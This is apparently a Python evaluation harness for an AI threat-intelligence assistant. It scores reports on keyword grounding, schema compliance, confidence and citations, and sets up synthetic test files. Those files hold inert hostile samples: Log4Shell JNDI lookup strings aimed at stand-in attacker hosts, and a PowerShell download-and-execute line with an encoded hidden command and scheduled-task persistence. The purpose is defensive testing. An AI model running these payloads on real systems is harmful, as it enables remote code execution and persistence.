"""
Evaluation framework for Threat Intelligence Assistant.

Includes:
  - Synthetic test file creation
  - 5 test cases x 4 modes (raw, no_tools, rag, full)
  - 4-dimensional evaluation:
    1. Keyword grounding (synonym-aware)
    2. Schema compliance
    3. Confidence consistency (Stage 2 vs Stage 3)
    4. Citation integrity (grounded / empty / unused / orphaned)
  - Raw mode gracefully handled (schema/citation/confidence = N/A)
"""

import json
from pathlib import Path
from collections import defaultdict
from typing import Any

from tools import analyze_file
from pipeline import run_pipeline


# ═══════════════════════════════════════════════════════════════════════
# Synthetic Test Files
# ═══════════════════════════════════════════════════════════════════════

TEST_FILES_DIR = Path("data/test_files")

FILE_A = str(TEST_FILES_DIR / "suspicious_app.jar")
FILE_B = str(TEST_FILES_DIR / "clean_config.xml")
FILE_C = str(TEST_FILES_DIR / "update_script.ps1")


def create_test_files():
    """Create synthetic test files for evaluation."""
    TEST_FILES_DIR.mkdir(parents=True, exist_ok=True)

    Path(FILE_A).write_text(
        "PK\x03\x04fake-zip-header\n"
        "META-INF/MANIFEST.MF\n"
        "Main-Class: com.example.App\n"
        "org.apache.logging.log4j.core.lookup.JndiLookup\n"
        "JndiLookup.class\n"
        "log4j-core-2.14.1.jar\n"
        "${jndi:ldap://attacker.example.com/exploit}\n"
        "${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://evil.com/a}\n"
        "http://callback.evil.com:8888/stage2\n"
        "Runtime.getRuntime().exec(cmd)\n"
        'ProcessBuilder pb = new ProcessBuilder("/bin/sh", "-c", payload);\n'
    )

    Path(FILE_B).write_text(
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        "<configuration>\n"
        '  <appender name="Console" class="ch.qos.logback.core.ConsoleAppender">\n'
        "    <encoder>\n"
        '      <pattern>%d{HH:mm:ss.SSS} [%thread] %-5level %logger{36} - %msg%n</pattern>\n'
        "    </encoder>\n"
        "  </appender>\n"
        '  <root level="INFO">\n'
        '    <appender-ref ref="Console" />\n'
        "  </root>\n"
        "</configuration>\n"
    )

    Path(FILE_C).write_text(
        "# System maintenance script\n"
        "$url = 'http://dl.example.com/payload.exe'\n"
        "$out = 'C:\\Windows\\Temp\\svchost.exe'\n"
        "Invoke-Expression (New-Object Net.WebClient).DownloadString($url)\n"
        "powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA\n"
        "cmd /c whoami && net user\n"
        "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\n"
        "schtasks /create /tn Update /tr $out /sc onlogon\n"
    )

    for f in [FILE_A, FILE_B, FILE_C]:
        p = Path(f)
        print(f"Created: {p} ({p.stat().st_size} bytes)")


def smoke_test_file_a():
    """Quick analysis of FILE_A to verify tools work."""
    fa = analyze_file(FILE_A)
    print(f"  Type: {fa['metadata']['file_type_magic']}")
    print(f"  Entropy: {fa['metadata']['shannon_entropy']} ({fa['metadata']['entropy_assessment']})")
    print(f"  String categories: {list(fa['string_categories'].keys())}")
    print(f"  YARA matches: {[m['rule'] for m in fa['yara_matches']]}")
    if fa["errors"]:
        print(f"  Errors: {fa['errors']}")


# ═══════════════════════════════════════════════════════════════════════
# Test Cases (flexible synonym matching)
# ═══════════════════════════════════════════════════════════════════════

TEST_CASES = [
    {
        "name": "1. CVE lookup — Log4Shell",
        "query": "What can you tell me about CVE-2021-44228?",
        "file_path": None,
        "expected": {
            "should_mention": [
                ["log4j", "log4shell"],
                ["CVE-2021-44228"],
                ["code execution", "rce", "arbitrary code"],
            ],
            "should_not_claim": ["your system is affected", "exploit confirmed"],
        },
    },
    {
        "name": "2. Vague / insufficient input",
        "query": "Is this dangerous?",
        "file_path": None,
        "expected": {
            "should_mention": [
                ["insufficient", "no strong indicators", "not enough",
                 "cannot determine", "unable to assess", "more context"],
            ],
            "should_not_claim": ["malware", "safe"],
        },
    },
    {
        "name": "3. Malicious JAR + CVE + ATT&CK",
        "query": (
            "I found a suspicious JAR file. Can you check if it's related "
            "to CVE-2021-44228 and map any ATT&CK techniques?"
        ),
        "file_path": FILE_A,
        "expected": {
            "should_mention": [
                ["CVE-2021-44228"],
                ["jndi", "log4j", "log4shell"],
            ],
            "should_not_claim": ["confirmed compromise", "proven vulnerable"],
        },
    },
    {
        "name": "4. Clean file analysis",
        "query": "Analyze this config file for any threats.",
        "file_path": FILE_B,
        "expected": {
            "should_mention": [
                ["no strong indicators", "no suspicious", "no threats",
                 "benign", "insufficient", "not performed",
                 "no malicious", "no evidence"],
            ],
            "should_not_claim": ["malware", "confirmed"],
        },
    },
    {
        "name": "5. Suspicious PowerShell script",
        "query": (
            "Check this PowerShell script for malicious behavior and "
            "map ATT&CK techniques."
        ),
        "file_path": FILE_C,
        "expected": {
            "should_mention": [
                ["powershell", "script"],
                ["download", "invoke", "execution", "suspicious"],
            ],
            "should_not_claim": ["safe", "benign"],
        },
    },
]

MODES = ["raw", "no_tools", "rag", "full"]


# ═══════════════════════════════════════════════════════════════════════
# Run All Tests
# ═══════════════════════════════════════════════════════════════════════

def run_all_tests(verbose: bool = True) -> list[dict]:
    """Run all test cases across all modes. Returns list of result dicts."""
    all_results = []
    for tc in TEST_CASES:
        for mode in MODES:
            print(f"\n{'='*60}")
            print(f"TEST: {tc['name']}  |  MODE: {mode}")
            print(f"{'='*60}")
            trace = run_pipeline(
                user_query=tc["query"],
                file_path=tc.get("file_path"),
                mode=mode,
                verbose=verbose,
            )
            all_results.append({
                "test": tc["name"],
                "mode": mode,
                "trace": trace,
                "expected": tc["expected"],
            })
    return all_results


# ═══════════════════════════════════════════════════════════════════════
# Helper: extract text from report (handles raw string or JSON dict)
# ═══════════════════════════════════════════════════════════════════════

def _report_to_text(report) -> str:
    """Convert a report (str for raw mode, dict for pipeline modes) to searchable text."""
    if isinstance(report, str):
        return report.lower()
    return json.dumps(report).lower()


def _is_raw(trace: dict) -> bool:
    return trace.get("mode") == "raw"


# ═══════════════════════════════════════════════════════════════════════
# Evaluation Dimension 1: Flexible Keyword Grounding
# ═══════════════════════════════════════════════════════════════════════

def eval_keywords(report, expected: dict) -> dict:
    """should_mention entries are synonym LISTS — any match counts.
    Works for both raw text (str) and structured report (dict)."""
    report_text = _report_to_text(report)
    mention_results = {}
    for synonym_group in expected.get("should_mention", []):
        matched = any(syn.lower() in report_text for syn in synonym_group)
        label = " | ".join(synonym_group)
        mention_results[label] = matched
    false_claims = {
        kw: kw.lower() in report_text
        for kw in expected.get("should_not_claim", [])
    }
    mention_rate = sum(mention_results.values()) / max(len(mention_results), 1)
    return {
        "mention_rate": mention_rate,
        "hallucination_count": sum(false_claims.values()),
        "detail": {"hits": mention_results, "false_claims": false_claims},
    }


# ═══════════════════════════════════════════════════════════════════════
# Evaluation Dimension 2: Schema Compliance
# ═══════════════════════════════════════════════════════════════════════

REQUIRED_REPORT_KEYS = {"summary", "assessment", "attack_mapping",
                        "key_evidence", "analyst_notes"}
REQUIRED_ASSESSMENT_KEYS = {"confidence", "status", "scope_limits"}
REQUIRED_NOTES_KEYS = {"what_is_supported", "what_is_not_supported",
                       "recommended_next_steps"}
VALID_CONFIDENCE = {"low", "medium", "high"}


def eval_schema(report, is_raw: bool = False) -> dict:
    """Check schema compliance. Returns N/A for raw mode."""
    if is_raw:
        return {"valid": None, "issues": ["N/A (raw mode)"]}
    if not isinstance(report, dict):
        return {"valid": False, "issues": ["Report is not a dict"]}
    if "error" in report:
        return {"valid": False, "issues": ["API error — no report generated"]}
    issues = []
    missing_top = REQUIRED_REPORT_KEYS - set(report.keys())
    if missing_top:
        issues.append(f"Missing top-level keys: {missing_top}")
    assessment = report.get("assessment", {})
    missing_assess = REQUIRED_ASSESSMENT_KEYS - set(assessment.keys())
    if missing_assess:
        issues.append(f"Missing assessment keys: {missing_assess}")
    notes = report.get("analyst_notes", {})
    missing_notes = REQUIRED_NOTES_KEYS - set(notes.keys())
    if missing_notes:
        issues.append(f"Missing analyst_notes keys: {missing_notes}")
    if not isinstance(report.get("attack_mapping"), list):
        issues.append("attack_mapping should be a list")
    if not isinstance(report.get("key_evidence"), list):
        issues.append("key_evidence should be a list")
    conf = assessment.get("confidence", "").lower()
    if conf and conf not in VALID_CONFIDENCE:
        issues.append(f"Unexpected confidence value: '{conf}'")
    return {"valid": len(issues) == 0, "issues": issues}


# ═══════════════════════════════════════════════════════════════════════
# Evaluation Dimension 3: Confidence Consistency
# ═══════════════════════════════════════════════════════════════════════

def eval_confidence_consistency(trace: dict) -> dict:
    """Check S2 vs S3 confidence match. Returns N/A for raw mode."""
    if _is_raw(trace):
        return {
            "stage2_confidence": "N/A",
            "stage3_confidence": "N/A",
            "consistent": None,
        }
    s2 = trace.get("stage2_analysis", {})
    s3 = trace.get("final_report", {})
    if not isinstance(s3, dict):
        return {"stage2_confidence": "?", "stage3_confidence": "?", "consistent": None}
    s2_conf = s2.get("case_assessment", {}).get("confidence", "MISSING").lower()
    s3_conf = s3.get("assessment", {}).get("confidence", "MISSING").lower()
    return {
        "stage2_confidence": s2_conf,
        "stage3_confidence": s3_conf,
        "consistent": s2_conf == s3_conf,
    }


# ═══════════════════════════════════════════════════════════════════════
# Evaluation Dimension 4: Citation Integrity
# ═══════════════════════════════════════════════════════════════════════

def eval_citation_integrity(trace: dict) -> dict:
    """Check citation chain. Returns N/A for raw mode."""
    if _is_raw(trace):
        return {
            "available_citations": 0,
            "referenced_citations": 0,
            "orphaned_citations": [],
            "status": "n/a",
            "all_grounded": None,
        }
    s2 = trace.get("stage2_analysis", {})
    s3 = trace.get("final_report", {})
    if not isinstance(s3, dict):
        return {
            "available_citations": 0, "referenced_citations": 0,
            "orphaned_citations": [], "status": "n/a", "all_grounded": None,
        }
    citation_map = s2.get("citation_map", [])
    available = set()
    for entry in citation_map:
        if isinstance(entry, dict):
            available.add(entry.get("label", ""))
        elif isinstance(entry, str):
            available.add(entry)
    referenced = set()
    for ev in s3.get("key_evidence", []):
        for c in ev.get("evidence_citations", []):
            referenced.add(c)
    for am in s3.get("attack_mapping", []):
        for c in am.get("evidence_citations", []):
            referenced.add(c)
    orphaned = referenced - available if available else set()
    if len(available) == 0 and len(referenced) == 0:
        status = "empty"
    elif len(available) > 0 and len(referenced) == 0:
        status = "unused"
    elif len(orphaned) > 0:
        status = "orphaned"
    else:
        status = "grounded"
    return {
        "available_citations": len(available),
        "referenced_citations": len(referenced),
        "orphaned_citations": sorted(orphaned) if orphaned else [],
        "status": status,
        "all_grounded": status == "grounded",
    }


# ═══════════════════════════════════════════════════════════════════════
# Evaluation Display Functions
# ═══════════════════════════════════════════════════════════════════════

def print_eval_table(all_results: list[dict]) -> list[dict]:
    """Print evaluation table and return eval_details list."""
    header = (f"{'Test':<38} {'Mode':<10} {'Mention':<9} {'Halluc':<8} "
              f"{'Schema':<8} {'ConfOK':<8} {'CitStat':<12} {'Conf'}")
    print(header)
    print("\u2500" * len(header))

    eval_details = []

    for r in all_results:
        report = r["trace"].get("final_report", {})
        is_raw = r["mode"] == "raw"
        kw = eval_keywords(report, r["expected"])
        sch = eval_schema(report, is_raw=is_raw)
        cc = eval_confidence_consistency(r["trace"])
        ci = eval_citation_integrity(r["trace"])

        if is_raw:
            conf_str = "n/a"
        elif isinstance(report, dict):
            conf_str = report.get("assessment", {}).get("confidence", "n/a")
        else:
            conf_str = "n/a"

        detail = {
            "test": r["test"], "mode": r["mode"],
            "keywords": kw, "schema": sch,
            "confidence_consistency": cc, "citations": ci,
        }
        eval_details.append(detail)

        cit_icon = {
            "grounded": "\u2713", "empty": "\u25cb",
            "unused": "\u25b3", "orphaned": "\u2717", "n/a": "-",
        }
        if sch["valid"] is None:
            sch_icon = "-"
        else:
            sch_icon = "\u2713" if sch["valid"] else "\u2717"
        if cc["consistent"] is None:
            cc_icon = "-"
        else:
            cc_icon = "\u2713" if cc["consistent"] else "\u2717"
        cit_sym = cit_icon.get(ci["status"], "?")

        print(
            f"{r['test']:<38} {r['mode']:<10} "
            f"{kw['mention_rate']:.0%}      "
            f"{kw['hallucination_count']}       "
            f"{sch_icon}       "
            f"{cc_icon}       "
            f"{cit_sym:<3}({ci['status']:<9}) "
            f"{conf_str}"
        )

    return eval_details


def print_failure_report(eval_details: list[dict]):
    """Print detailed failure inspection."""
    print("\n" + "=" * 60)
    print("DETAILED FAILURE REPORT")
    print("=" * 60)

    any_issues = False

    for d in eval_details:
        is_raw = d["mode"] == "raw"
        issues = []
        missed = [k for k, v in d["keywords"]["detail"]["hits"].items() if not v]
        if missed:
            issues.append(f"  Missing keywords: {missed}")
        halluc = [k for k, v in d["keywords"]["detail"]["false_claims"].items() if v]
        if halluc:
            issues.append(f"  Hallucinated claims containing: {halluc}")
        if not is_raw:
            if d["schema"]["valid"] is False:
                for iss in d["schema"]["issues"]:
                    issues.append(f"  Schema: {iss}")
            if d["confidence_consistency"]["consistent"] is False:
                issues.append(
                    f"  Confidence mismatch: "
                    f"S2='{d['confidence_consistency']['stage2_confidence']}' "
                    f"vs S3='{d['confidence_consistency']['stage3_confidence']}'"
                )
            cit = d["citations"]
            if cit["status"] == "empty":
                issues.append("  Citations: Stage 2 produced no citation_map entries.")
            elif cit["status"] == "unused":
                issues.append(
                    f"  Citations: Stage 2 has {cit['available_citations']} labels "
                    f"but Stage 3 referenced none."
                )
            elif cit["status"] == "orphaned":
                issues.append(f"  Citations: orphaned refs = {cit['orphaned_citations']}")
        if issues:
            any_issues = True
            print(f"\n[{d['test']}] mode={d['mode']}")
            for iss in issues:
                print(iss)

    if not any_issues:
        print("\nAll checks passed across all test cases and modes.")


def print_mode_summary(eval_details: list[dict]):
    """Print mode comparison summary."""
    mode_stats = defaultdict(lambda: {
        "mention_sum": 0, "halluc_sum": 0,
        "schema_pass": 0, "schema_applicable": 0,
        "conf_pass": 0, "conf_applicable": 0,
        "cite_grounded": 0, "cite_empty": 0, "cite_unused": 0,
        "cite_applicable": 0,
        "n": 0,
    })

    for d in eval_details:
        m = mode_stats[d["mode"]]
        m["mention_sum"] += d["keywords"]["mention_rate"]
        m["halluc_sum"] += d["keywords"]["hallucination_count"]
        m["n"] += 1
        # Schema / confidence / citations: skip N/A (raw mode)
        if d["schema"]["valid"] is not None:
            m["schema_applicable"] += 1
            m["schema_pass"] += int(d["schema"]["valid"])
        if d["confidence_consistency"]["consistent"] is not None:
            m["conf_applicable"] += 1
            m["conf_pass"] += int(d["confidence_consistency"]["consistent"])
        cit_status = d["citations"]["status"]
        if cit_status != "n/a":
            m["cite_applicable"] += 1
            m["cite_grounded"] += int(cit_status == "grounded")
            m["cite_empty"] += int(cit_status == "empty")
            m["cite_unused"] += int(cit_status == "unused")

    header = (f"{'Mode':<12} {'Avg Mention':<13} {'Halluc':<8} "
              f"{'Schema':<9} {'ConfOK':<9} {'Cite ✓':<9} {'Cite ○':<9} {'Cite △'}")
    print(f"\n{header}")
    print("─" * 82)

    for mode in MODES:
        m = mode_stats[mode]
        n = m["n"]

        def _frac(num, denom):
            return f"{num}/{denom}" if denom > 0 else "n/a"

        mention_pct = f"{m['mention_sum']/n:.0%}" if n else "n/a"
        print(
            f"{mode:<12} "
            f"{mention_pct:<13} "
            f"{m['halluc_sum']:<8} "
            f"{_frac(m['schema_pass'], m['schema_applicable']):<9} "
            f"{_frac(m['conf_pass'], m['conf_applicable']):<9} "
            f"{_frac(m['cite_grounded'], m['cite_applicable']):<9} "
            f"{_frac(m['cite_empty'], m['cite_applicable']):<9} "
            f"{_frac(m['cite_unused'], m['cite_applicable'])}"
        )

    print("\nLegend: \u2713=grounded  \u25cb=empty (expected for no_tools/raw)  "
          "\u25b3=unused (S2 has citations, S3 ignored them)")


def print_token_summary(all_results: list[dict]):
    """Print token usage and cost summary per mode."""
    mode_tokens = defaultdict(lambda: {
        "prompt": 0, "completion": 0, "cost": 0.0,
        "latency": 0.0, "n": 0,
    })
    for r in all_results:
        u = r["trace"].get("token_usage", {})
        m = mode_tokens[r["mode"]]
        m["prompt"] += u.get("prompt_tokens", 0)
        m["completion"] += u.get("completion_tokens", 0)
        cost_val = u.get("cost_usd", 0)
        m["cost"] += cost_val if isinstance(cost_val, (int, float)) else 0
        m["latency"] += u.get("latency_seconds", 0)
        m["n"] += 1

    header = (f"{'Mode':<12} {'Prompt Tok':<12} {'Compl Tok':<12} "
              f"{'Total Tok':<12} {'Cost ($)':<10} {'Avg Latency'}")
    print(f"\n{header}")
    print("\u2500" * 70)

    grand_cost = 0.0
    for mode in MODES:
        m = mode_tokens[mode]
        n = m["n"]
        total = m["prompt"] + m["completion"]
        avg_lat = m["latency"] / n if n else 0
        grand_cost += m["cost"]
        print(
            f"{mode:<12} "
            f"{m['prompt']:<12} "
            f"{m['completion']:<12} "
            f"{total:<12} "
            f"${m['cost']:<9.4f} "
            f"{avg_lat:.1f}s"
        )

    print(f"\nTotal cost across all runs: ${grand_cost:.4f}")
